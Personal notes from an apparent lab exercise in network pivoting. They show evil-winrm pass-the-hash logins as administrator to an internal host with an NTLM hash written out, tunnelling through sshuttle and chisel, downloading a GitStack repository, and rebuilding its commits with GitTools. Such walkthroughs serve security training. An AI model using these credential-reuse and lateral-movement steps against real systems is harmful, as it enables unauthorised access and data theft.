So rather than going and simply fuzzing we will take a you turn and simply download the source code locally aka move laterally.

Note that we have both the sshuttle and chisel running in order to access the personal webpage

```
evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.101.150
```
![[Pasted image 20240101153504.png]]


```
C:\GitStack\repositories\Website.git
```

Will pop up one more shell
```
evil-winrm -u administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.101.150
```

```
download Website.git
```

It sure took a lot of time to download this file b/w 2 proxy's but in the end we are able to download it.

```
mv Website.git .git
```

 the server doesn't need to store the easily readable versions of the files, this means that what we've downloaded isn't actually the full repository, so much as the building blocks we can use to recreate the repo (which is exactly what happens when using `git clone` to create a local copy of a repo!).

In order to extract the information from the repository, we use a suite of tools called GitTools.
```
git clone https://github.com/internetwache/GitTools
```

Git-Tools have 3 tools:
Dumper 
Extractor
Finder

So Extractors fits out requirement so will be using it from now.
```
./extractor.sh REPO_DIR DESTINATION_DIR
```
```
./extractor.sh ../../../Website.git ../../../Website
```

So let's analize what happened we simply download a website.git folder
And make .git folder inside that folder containing the same contents as well as git clone git tools in that only.



This is the output that we want

Each of these corresponds to a commit; however, as mentioned previously, these are not sorted by date.

```
separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
